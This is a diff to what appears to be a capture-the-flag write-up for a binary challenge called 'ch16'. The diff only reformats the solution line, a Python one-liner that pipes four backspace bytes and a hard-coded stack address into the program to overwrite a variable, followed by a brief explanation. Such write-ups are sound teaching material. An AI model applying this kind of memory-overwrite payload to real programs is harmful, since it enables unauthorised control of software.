@@ -98,7 +98,7 @@ The difference is -4 bytes, which means we need to take 4 steps back to get to t
 
 # Solution
 
-(python3 -c "import sys; sys.stdout.buffer.write(b'\x08' * 4 + b'\xbc\xfa\xff\xbf')"; cat) | ./ch16
+```(python3 -c "import sys; sys.stdout.buffer.write(b'\x08' * 4 + b'\xbc\xfa\xff\xbf')"; cat) | ./ch16```
 
 We enter the same line, here ```b'\x08' * 4``` takes -4 steps back in the buffer and the next entry ```b'\xbc\xfa\xff\xbf'``` we write the value into this variable so that the conditions are met
 
